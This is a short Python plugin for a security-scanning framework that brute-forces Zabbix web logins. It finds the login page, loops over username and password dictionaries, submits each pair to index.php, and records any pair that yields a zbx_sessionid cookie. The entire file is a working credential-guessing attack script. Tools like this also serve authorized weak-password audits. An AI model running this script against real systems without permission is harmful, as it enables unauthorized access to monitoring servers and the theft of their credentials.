#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.ZABBIX
        self.name = 'zabbix burst'
        self.keyword = ['web', 'zabbix', 'burst']
        self.info = 'Burst zabbix weakpass.'
        self.type = 'weakpass'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    def prove(self):
        self.get_url()
        if self.base_url:
            usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file('dict/zabbix_usernames.txt')
            passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file('dict/zabbix_passwords.txt')
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './zabbix/'),
                self.url_normpath(self.base_url, '/zabbix/'),
                self.url_normpath(self.url, './'),
            ]))
            for path in path_list:
                url = path + "/index.php"
                res = self.curl('get', url)
                if res and 'zabbix' in res.text :
                    for linef1 in usernamedic:
                        username = linef1.strip('\r').strip('\n')
                        for linef2 in passworddic:
                            try:
                                password = (
                                    linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
                                    '\r').strip('\n')
                                data = "name=" + username + "&password=" + password + "&autologin=1&enter=Sign+in"
                                res = self.curl('post',url,data = data, allow_redirects=False)
                                if res and res.status_code == 301 and 'Set-Cookie' in res.headers.keys() and 'zbx_sessionid' in res.headers['Set-Cookie']:
                                    self.flag = 1
                                    self.req.append({"username": username,"password":password})
                                    self.res.append({"info": username + "/" + password, "key": ":".join([username, password])})
                                    return
                            except Exception:
                                pass